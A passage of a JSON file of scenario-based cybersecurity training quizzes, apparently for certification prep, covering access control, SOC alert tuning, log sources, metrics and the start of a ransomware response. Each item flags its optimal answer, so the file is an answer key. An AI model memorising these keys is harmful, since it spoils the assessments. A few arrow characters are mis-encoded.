            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Too many people know the password",
            "feedback": "{'short': 'Part of the problem but not the primary issue', 'detailed': \"Multiple people knowing the password increases exposure, but even if only two people knew it, you still couldn't determine which one performed an action. Individual accounts solve both the exposure and accountability problems.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "The password should be more complex",
            "feedback": "{'short': \"Password complexity doesn't address shared account issues\", 'detailed': \"A complex password on a shared account still has no accountability. Password complexity is good practice but doesn't solve the fundamental problem of not knowing who did what.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "If something goes wrong with that admin account, how would you know who did it?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Shared accounts = no individual accountability. Logs show 'admin' but not which person. Essential for incident investigation and compliance."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Access Control Implementation",
        "situation": "A new employee joins the accounting team. They need access to the accounting system, email, and shared drives. You're setting up their access.\n\n**Question:** What is the BEST approach for granting this user access?",
        "options": [
          {
            "id": "A",
            "text": "Copy permissions from another accountant's account",
            "feedback": "{'short': 'May copy inappropriate or excessive access', 'detailed': \"The other accountant may have accumulated extra permissions over time (privilege creep), may have access specific to their duties that the new person doesn't need, or may have incorrect access themselves. Copying propagates problems.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Assign the Accountant role which has pre-defined appropriate access",
            "feedback": "{'short': 'Correct! Role-based access is consistent and manageable', 'detailed': \"RBAC approach: the Accountant role is pre-defined with appropriate permissions, all accountants get consistent access, changes to the role affect all members, and it's easy to audit who has what. New employee gets exactly what they need - no more, no less.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Give them full access and remove what they don't need later",
            "feedback": "{'short': 'Violates least privilege - start with maximum access?', 'detailed': \"This inverts least privilege. Starting with full access: exposes them to data they shouldn't see initially, creates risk if they make mistakes with excess access, and 'removing later' rarely happens. Start with minimum needed.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ask them what access they think they need",
            "feedback": "{'short': \"New employees don't know what they need\", 'detailed': \"A new employee doesn't know your systems or what access is appropriate. They might ask for too much (everything sounds useful) or too little (don't know what exists). Access should be defined by the role requirements, not user requests.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What access control approach provides consistent, appropriate access for job functions?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "RBAC: define roles with appropriate permissions, assign users to roles. Consistent access, easy management, supports least privilege."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Access Review Finding",
        "situation": "During an access review, you find that a user who transferred from Accounting to Marketing six months ago still has full access to the accounting system including sensitive financial data.\n\n**Question:** What is this situation called and how should it be addressed?",
        "options": [
          {
            "id": "A",
            "text": "This is normal - they might need it as backup",
            "feedback": "{'short': 'Keeping unnecessary access violates least privilege', 'detailed': \"Marketing doesn't need accounting access. Keeping 'just in case' access creates unnecessary risk. If they ever need temporary access, a proper request process exists. The access should be removed.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Privilege creep - revoke the accounting access immediately",
            "feedback": "{'short': \"Correct! Remove access that's no longer needed\", 'detailed': 'Privilege creep: accumulation of access as users change roles without removing old permissions. This user has access to sensitive financial data they no longer need. Revoke the accounting access - they have no business need for it in their current role. This is exactly what access reviews are designed to catch.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Ask the user if they still need the access",
            "feedback": "{'short': 'Users will almost always say yes', 'detailed': \"Users tend to keep access 'just in case' or because removing it requires explanation. The review should be based on business need, not user preference. A marketing person has no business need for full accounting access.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Document it for next year's review",
            "feedback": "{'short': 'Delays addressing a clear problem', 'detailed': 'The review found a problem - inappropriate access. Documenting for next year leaves the risk in place for another year. Reviews should result in action, not just documentation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What happens when users change roles but keep their old access?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Privilege creep: access accumulates over time. Movers should have old access removed when new access is granted. Reviews catch what was missed."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D4-SIM-001",
    "title": "SOC Operations and Monitoring",
    "domain": 4,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "SOC Manager",
    "organization": {
      "name": "Trident Financial Group",
      "industry": "Financial Services"
    },
    "introduction": "Trident Financial Group's SOC is drowning in alerts. Despite significant technology investments, critical incidents are being missed while analysts chase false positives. The board is concerned after learning that a data exfiltration was discovered by an external party rather than internal monitoring. As the new SOC Manager, you've been brought in to transform operations. David Chen has given you authority to restructure processes, tune systems, and implement best practices - but the clock is ticking on demonstrating improvement.",
    "learning_objectives": [
      "Explain security alerting and monitoring concepts and tools",
      "Given a scenario, use data sources to support an investigation",
      "Apply common security techniques to computing resources"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Addressing Alert Fatigue",
        "situation": "Your analysts are overwhelmed - 15,000 alerts per day with a 94% false positive rate. Morale is low, and critical alerts are being missed in the noise. You need to take immediate action.\n\n**Question:** What is the MOST effective first step to address alert fatigue?",
        "options": [
          {
            "id": "A",
            "text": "Hire more analysts to handle the alert volume",
            "feedback": "{'short': \"More analysts won't fix a 94% false positive rate\", 'detailed': \"Adding analysts to investigate false positives doesn't solve the problem - it just adds more people wasting time. At 94% false positive rate, you're asking analysts to find needles in a haystack. Fix the signal-to-noise ratio first, then right-size the team.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement systematic alert tuning starting with highest-volume false positive sources",
            "feedback": "{'short': 'Correct! Reduce noise by tuning high-volume false positives', 'detailed': \"Alert tuning is the highest-impact first step. Analyze the top false positive generators, understand why they're firing incorrectly, and tune thresholds, add exclusions, or disable ineffective rules. Focus on high-volume sources first for maximum impact. A few weeks of focused tuning can dramatically improve signal-to-noise.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Replace the SIEM with a newer solution",
            "feedback": "{'short': \"New tools won't fix process problems\", 'detailed': \"The SIEM (Splunk) is a capable tool - the problem is how it's configured and tuned. A new SIEM will have the same problems without proper tuning and processes. Fix the process first; consider tool changes later if needed.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Disable all medium and low severity alerts",
            "feedback": "{'short': 'May eliminate valid detections along with noise', 'detailed': 'Blanket severity filtering is too blunt - some medium/low alerts may indicate real threats in context. Instead, tune individual rules based on their false positive rate and value. A well-tuned medium alert is better than a noisy critical alert.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "With 94% false positives, what action directly addresses the signal-to-noise ratio?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Alert tuning: analyze false positive sources, adjust thresholds/exclusions, disable low-value rules. Start with highest-volume false positives for maximum impact."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Critical Log Source Gap",
        "situation": "Your log inventory reveals critical gaps - no DNS logging, no cloud visibility, and no database audit logs. These gaps explain why the cryptominer ran for 3 weeks undetected (DNS beaconing) and the data exfiltration was missed (database access).\n\n**Question:** Which log source should be prioritized FIRST for integration?",
        "options": [
          {
            "id": "A",
            "text": "Database audit logs - protect the crown jewels",
            "feedback": "{'short': 'Important but not the highest-impact first choice', 'detailed': 'Database audit logs are valuable for detecting data access anomalies. However, DNS logging provides broader visibility across the entire attack chain - C2 communication, data exfiltration, and malware callbacks. DNS catches threats that database logs would miss.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "DNS logs - visibility into C2, exfiltration, and malware communication",
            "feedback": "{'short': 'Correct! DNS provides broad visibility across the attack chain', 'detailed': \"DNS logging is often called the 'gold mine' of security monitoring. Almost all malware uses DNS for C2, exfiltration often uses DNS tunneling, and DNS queries reveal attacker infrastructure. The cryptominer used DNS beaconing - DNS logs would have detected it. High value, relatively easy to integrate.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Cloud logs - modern infrastructure requires cloud visibility",
            "feedback": "{'short': 'Important if cloud usage is significant', 'detailed': 'Cloud logging is essential for organizations with significant cloud workloads. However, the immediate incidents (cryptominer, data exfiltration) occurred on-premises. DNS logging would have detected both. Prioritize based on where threats are manifesting.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "VPN logs - critical for remote access visibility",
            "feedback": "{'short': 'Useful but more limited detection value', 'detailed': \"VPN logs show remote access patterns - useful for access anomaly detection. But VPN logs wouldn't have detected the cryptominer or data exfiltration, which occurred from internal systems. DNS has broader detection applicability.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What log source would have detected the cryptominer's C2 beaconing?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "DNS logging detects: C2 communication (beaconing to malicious domains), DNS tunneling (data exfiltration), DGA domains (malware), threat intelligence matches."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Triage Process Optimization",
        "situation": "Current process: Tier 1 analysts investigate every alert from scratch. Average investigation time is 12 minutes, but most of that time is spent gathering basic context that should be automated. Analysts report that 80% of their time is repetitive lookups.\n\n**Question:** What improvement will most significantly improve triage efficiency?",
        "options": [
          {
            "id": "A",
            "text": "Create detailed playbooks for every alert type",
            "feedback": "{'short': \"Playbooks help but don't solve the repetitive lookup problem\", 'detailed': \"Playbooks standardize response but don't eliminate the manual lookups consuming 80% of analyst time. Playbooks tell analysts WHAT to look up; automation DOES the lookups. Combine playbooks with automation for maximum effect.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Automatic alert enrichment - add asset, user, and threat intel context to alerts",
            "feedback": "{'short': 'Correct! Automate repetitive context gathering', 'detailed': 'Alert enrichment automatically adds context: asset information (criticality, owner, OS), user context (role, department, behavior baseline), threat intelligence (is IP/domain malicious?), and historical alerts. When an analyst opens an alert, context is already present. This eliminates 80% of repetitive lookups and lets analysts focus on analysis, not data gathering.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Train Tier 1 analysts to investigate faster",
            "feedback": "{'short': \"Training helps but doesn't eliminate waste\", 'detailed': 'Better-trained analysts still have to do the same manual lookups. Training improves quality and may marginally improve speed, but the fundamental inefficiency of manual context gathering remains. Automate the repetitive work.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Skip Tier 1 - send all alerts directly to Tier 2",
            "feedback": "{'short': 'Moves the problem without solving it', 'detailed': 'Tier 2 would face the same inefficiency issues. The tiered model exists for good reason - Tier 1 handles volume, Tier 2 handles complexity. Improve Tier 1 efficiency rather than eliminating the tier.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "If 80% of time is repetitive lookups, what would eliminate that repetitive work?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Alert enrichment automatically gathers context (asset info, user details, threat intel) so analysts can analyze instead of lookup."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Threat Intelligence Integration",
        "situation": "Trident has purchased threat intelligence feeds but they're not well integrated. Analysts manually check indicators against external sources. The FS-ISAC membership provides valuable financial sector intelligence that's currently ignored.\n\n**Question:** How should threat intelligence be integrated into SOC operations?",
        "options": [
          {
            "id": "A",
            "text": "Create a separate threat intelligence team to analyze reports",
            "feedback": "{'short': 'Separate team creates silos', 'detailed': \"A separate threat intel team without integration into operations means intelligence doesn't reach analysts when needed. Intelligence must be operationalized - integrated into detection, enrichment, and investigation workflows. Embed intelligence into SOC processes, not a separate team.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Automated IOC matching in SIEM plus analyst-accessible TIP for investigation",
            "feedback": "{'short': 'Correct! Operationalize intelligence through automation and accessibility', 'detailed': 'Effective threat intel integration: automated matching (IOCs imported to SIEM watchlists for automatic detection and enrichment), accessible platform (Threat Intelligence Platform where analysts can search indicators during investigation), and contextual intelligence (FS-ISAC reports integrated into analyst briefings and detection engineering). Intelligence should be both automated AND accessible.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Send threat intelligence reports to all analysts daily",
            "feedback": "{'short': 'Information overload without operationalization', 'detailed': \"Emailing reports doesn't operationalize intelligence. Analysts need intelligence integrated into their workflows - matched against alerts, available during investigation, informing detection rules. Reading reports doesn't scale; automation does.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Block all IOCs at the firewall automatically",
            "feedback": "{'short': 'Blocking without analysis can cause problems', 'detailed': 'Automatic blocking without validation can block legitimate traffic (false positives in feeds) or alert adversaries (they notice blocks). Intelligence should inform detection and investigation first. Blocking is appropriate for high-confidence indicators after validation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can intelligence be automatically applied while also being available for manual investigation?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Integrate at multiple levels: IOC watchlists in SIEM (automatic detection), enrichment (add intel to alerts), TIP (analyst investigation), and detection engineering (TTPs inform rules)."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Detection Engineering Strategy",
        "situation": "Most of Trident's SIEM rules are vendor-provided defaults that haven't been customized. You notice there's heavy reliance on signature-based detection (known bad IPs, hashes) with few behavior-based detections.\n\n**Question:** How should detection engineering be approached to improve detection capabilities?",
        "options": [
          {
            "id": "A",
            "text": "Focus on adding more threat intelligence feeds for better signature coverage",
            "feedback": "{'short': \"Signatures alone can't detect unknown threats\", 'detailed': \"More IOC feeds improve signature coverage but signatures only detect KNOWN threats. The cryptominer wasn't detected because it didn't match known signatures. Behavior-based detection catches threats regardless of specific indicators. Balance is needed.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Balance signature and behavior-based detection, map to MITRE ATT&CK for coverage",
            "feedback": "{'short': 'Correct! Multiple detection types with coverage visibility', 'detailed': 'Effective detection engineering: signature-based for known threats (quick wins, low false positives), behavior-based for technique detection (catches unknown variants), and MITRE ATT&CK mapping to identify gaps. MITRE ATT&CK shows which adversary techniques you can detect and which are blind spots. This systematic approach ensures comprehensive coverage.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Replace all rules with machine learning-based anomaly detection",
            "feedback": "{'short': 'ML alone has high false positives and misses context', 'detailed': \"Pure anomaly detection generates many false positives - unusual doesn't always mean malicious. ML is valuable as one detection type but shouldn't replace rule-based detection. Layered approach: signatures, behaviors, AND anomaly detection each catch different threats.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only create custom rules after specific incidents",
            "feedback": "{'short': 'Reactive approach leaves gaps until exploitation', 'detailed': \"Waiting for incidents means threats succeed before detection exists. Proactive detection engineering uses threat intelligence and MITRE ATT&CK to build detections for likely attack techniques BEFORE they're used against you. Balance reactive (learn from incidents) with proactive (anticipate threats).\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What framework helps identify detection gaps across adversary techniques?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "MITRE ATT&CK maps adversary techniques. Map your detections to ATT&CK to see coverage and gaps. Balance signature (known) and behavior (technique) detection."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Key SOC Metrics",
        "situation": "David Chen asks for a monthly metrics report for leadership. Currently, the SOC reports 'alerts handled' which doesn't convey security effectiveness. You need to establish meaningful metrics.\n\n**Question:** What is the MOST important metric for demonstrating SOC effectiveness to leadership?",
        "options": [
          {
            "id": "A",
            "text": "Total alerts processed per month",
            "feedback": "{'short': \"Volume metric doesn't indicate security outcomes\", 'detailed': \"Processing 15,000 alerts/day means nothing if they're mostly false positives and real threats are missed. Volume metrics (alerts processed, tickets closed) measure activity, not effectiveness. Leadership needs outcome metrics.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR)",
            "feedback": "{'short': 'Correct! Time-based metrics directly measure security effectiveness', 'detailed': 'MTTD and MTTR directly measure security outcomes: MTTD = how quickly threats are identified (shorter = less dwell time for attackers), MTTR = how quickly threats are contained (shorter = less damage). These metrics are meaningful to leadership, comparable to industry benchmarks, and drive the right behaviors.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Number of security tools deployed",
            "feedback": "{'short': \"Tool count doesn't indicate effectiveness\", 'detailed': \"More tools doesn't mean better security - Trident has significant tooling but poor outcomes. Tool metrics measure investment, not results. Focus on what the tools achieve, not how many exist.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Analyst utilization rate",
            "feedback": "{'short': 'Analyst utilization is an internal efficiency metric', 'detailed': \"100% analyst utilization might mean they're drowning in false positives. Analyst metrics are important for SOC management but don't convey security effectiveness to leadership. MTTD/MTTR show whether the SOC is achieving its mission.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What metrics directly measure how quickly threats are detected and contained?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond) measure security outcomes. Lower times = less attacker dwell time = less damage."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Log Retention Strategy",
        "situation": "The SIEM is running low on storage. Current retention is 90 days for all logs. Finance asks why logs need to be kept so long, while compliance wants 7-year retention for certain data.\n\n**Question:** What log retention approach balances operational, compliance, and cost needs?",
        "options": [
          {
            "id": "A",
            "text": "Keep all logs for 7 years to meet the strictest requirement",
            "feedback": "{'short': 'Unnecessarily expensive - not all logs need 7-year retention', 'detailed': 'Keeping all logs for 7 years is extremely expensive and unnecessary. Compliance requires specific logs (authentication, financial transactions) be retained, not all logs. Operational logs may only need 90 days. Tiered approach optimizes cost.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Tiered retention: hot (searchable, 90 days), warm (1 year), cold archive (7 years for compliance-required logs)",
            "feedback": "{'short': 'Correct! Tiered retention balances needs and costs', 'detailed': 'Tiered retention: Hot storage (SIEM, fast search) for 90 days of operational investigation. Warm storage (indexed archive) for 1 year covering incident investigation and annual audit. Cold archive for 7 years of compliance-required logs only. This meets compliance, enables operations, and optimizes cost.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Reduce retention to 30 days to save costs",
            "feedback": "{'short': 'Violates compliance and limits investigation capability', 'detailed': '30-day retention likely violates PCI-DSS (1 year minimum) and SOX requirements. It also limits investigation - the cryptominer ran for 3 weeks, and investigation needed historical logs. Short retention saves money but creates compliance and operational risk.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only retain security-relevant logs, delete operational logs immediately",
            "feedback": "{'short': \"Determining 'security-relevant' is difficult\", 'detailed': \"It's hard to know in advance which logs will be needed for investigation. Operational logs (application logs, performance data) often provide crucial context. Better to retain broadly for operational period and archive selectively for compliance.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can different retention periods be applied to different needs (operational vs. compliance)?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Tiered retention: hot (fast search, short-term), warm (indexed, medium-term), cold (archive, long-term compliance). Different data has different retention requirements."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "24/7 Coverage Model",
        "situation": "The board wants 24/7 SOC coverage after the incidents that occurred on nights and weekends. Current 24/5 coverage with on-call for off-hours isn't meeting needs. You have budget for expanded coverage but not unlimited resources.\n\n**Question:** What coverage model best fits Trident's needs and constraints?",
        "options": [
          {
            "id": "A",
            "text": "Build full internal 24/7 SOC with three shifts",
            "feedback": "{'short': 'Very expensive and may not be necessary', 'detailed': 'Full 24/7 internal SOC requires 5-6 FTEs per seat for coverage (vacations, sick time, turnover). For a mid-size company like Trident, this is expensive and may have analysts sitting idle during quiet night shifts. Consider hybrid approaches.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Hybrid model: internal team for business hours, MSSP for nights/weekends with defined escalation",
            "feedback": "{'short': 'Correct! Hybrid balances coverage, cost, and context', 'detailed': 'Hybrid model provides: core internal team during business hours (organizational context, relationships, complex investigations), MSSP coverage for nights/weekends/holidays (monitoring and initial triage), defined escalation procedures (when to wake up internal team), and cost efficiency. Internal team handles most incidents during business hours; MSSP provides eyes on glass during off-hours.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Outsource entire SOC to MSSP for 24/7 coverage",
            "feedback": "{'short': 'Full outsource loses organizational context', 'detailed': \"Full MSSP loses the internal team's organizational knowledge, relationships, and context. MSSPs handle monitoring well but may struggle with complex investigations requiring business context. Hybrid preserves internal expertise while gaining coverage.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Implement automated response to handle off-hours without staff",
            "feedback": "{'short': \"Automation helps but can't replace human judgment\", 'detailed': \"Automation can handle routine responses but critical incidents need human judgment. Automated containment might cause business disruption, or attackers might evade automated responses. Automation augments human analysts, doesn't replace them for 24/7 coverage.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What model provides coverage while preserving internal expertise and managing costs?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Hybrid: internal team (business context, complex work) during business hours + MSSP (monitoring, triage) for nights/weekends. Define clear escalation criteria."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Detection Gap Analysis",
        "situation": "You've mapped current SIEM rules to MITRE ATT&CK. Results show strong coverage for Initial Access and Execution but major gaps in Defense Evasion, Lateral Movement, and Exfiltration.\n\n**Question:** How should detection development be prioritized based on this gap analysis?",
        "options": [
          {
            "id": "A",
            "text": "Strengthen Initial Access detections further since that's where attacks start",
            "feedback": "{'short': 'Already strong coverage - prioritize gaps', 'detailed': 'Initial Access detection is already strong. Attackers who bypass initial defenses can then move laterally and exfiltrate without detection (as demonstrated by recent incidents). Prioritize the gaps that allow attackers to succeed after initial compromise.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Prioritize Lateral Movement and Exfiltration - these gaps explain missed incidents",
            "feedback": "{'short': 'Correct! Address gaps that explain actual missed detections', 'detailed': 'The gap analysis explains why incidents were missed: cryptominer (Defense Evasion, no lateral movement detection), data exfiltration (no exfiltration detection). Prioritize detections for techniques actually used against you. Lateral movement detection catches attackers after initial compromise; exfiltration detection catches data theft - both are critical gaps.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Equal investment across all MITRE ATT&CK tactics",
            "feedback": "{'short': 'Not all gaps are equally critical', 'detailed': \"Some tactics are more critical than others for Trident's risk profile. Exfiltration detection is higher priority than, say, Resource Development detection (which often happens outside your visibility). Prioritize based on risk and achievability.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus only on techniques used in recent incidents",
            "feedback": "{'short': 'Too narrow - adversaries will use different techniques', 'detailed': 'Recent incidents inform priorities, but attackers adapt. Build detection for technique categories (lateral movement, exfiltration) that will catch variants, not just the exact TTPs from past incidents. Use incidents to prioritize areas, not to define complete scope.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which detection gaps explain the recent missed incidents?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Lateral movement and exfiltration gaps explain missed cryptominer (no C2 detection) and data theft. Prioritize gaps that caused actual misses."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "SOC Maturity Measurement",
        "situation": "After six months of improvements, David Chen asks how to demonstrate progress to the board. You need to show the SOC has matured from its initial struggling state.\n\n**Question:** What is the BEST way to demonstrate SOC maturity improvement to the board?",
        "options": [
          {
            "id": "A",
            "text": "List all the new tools and technologies implemented",
            "feedback": "{'short': \"Tools don't demonstrate outcomes\", 'detailed': 'The board cares about security outcomes, not technology inventory. Trident already had good tools - the problem was processes and configuration. Show what the tools ACHIEVED, not what tools exist.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Trend analysis showing MTTD/MTTR improvement, false positive reduction, and detection rate increase",
            "feedback": "{'short': 'Correct! Outcome metrics showing trend improvement', 'detailed': 'Board-level reporting should show: MTTD reduction (18 hours \u00e2\u2020\u2019 4 hours = faster threat detection), MTTR reduction (72 hours \u00e2\u2020\u2019 24 hours = faster containment), false positive rate reduction (94% \u00e2\u2020\u2019 20% = efficient operations), and internal detection rate (100% internally detected vs. external notification). Trends demonstrate sustainable improvement.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Third-party maturity assessment score",
            "feedback": "{'short': 'Assessments help but internal metrics are more meaningful', 'detailed': \"Third-party assessments provide external validation but: they're point-in-time snapshots, expensive, and may not capture recent improvements. Internal metrics showing trends are more current and directly tied to security outcomes. Consider assessments as supplement, not primary measure.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Number of incidents handled",
            "feedback": "{'short': \"Incident count doesn't show improvement\", 'detailed': 'More incidents might mean better detection OR worse security. Fewer incidents might mean less attacks OR worse detection. Incident count is ambiguous. MTTD/MTTR show capability regardless of attack volume.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What metrics show improvement in security outcomes over time?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Trend analysis: MTTD/MTTR trending down, false positive rate trending down, detection rate trending up. Show before/after and trajectory."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D4-SIM-002",
    "title": "Incident Response",
    "domain": 4,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": "50-65 minutes",
    "role": "Incident Response Lead",
    "organization": {
      "name": "Axiom Pharmaceuticals",
      "industry": "Pharmaceutical/Healthcare"
    },
    "introduction": "It's 6:47 AM and your phone is ringing. The SOC has detected ransomware actively encrypting servers in the research network. You're the Incident Response Lead, and this is the real thing. Drug research data worth billions is at risk, encryption is spreading, and the attacker claims to have stolen data. Every minute matters. Margaret Torres is en route and needs you to lead the technical response. What do you do?",
    "learning_objectives": [
      "Explain appropriate incident response activities",
      "Given a scenario, use data sources to support an investigation",
      "Explain the importance of change management processes and the impact to security"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Immediate First Response",
        "situation": "It's 6:47 AM. Ransomware is actively encrypting research servers. You've just arrived and are getting briefed. Encryption is spreading to new servers every few minutes. What's your first action?\n\n**Question:** What should be your IMMEDIATE first action?",
        "options": [
          {
            "id": "A",
            "text": "Begin forensic imaging of affected systems",
            "feedback": "{'short': 'Forensics is important but attack is still active', 'detailed': 'Forensic imaging is important for investigation but: the attack is still spreading, imaging takes hours per system, and more systems are being encrypted while you image. Stop the active attack first, then collect evidence. Containment before evidence collection when attack is active.'}",
            "is_optimal": false,
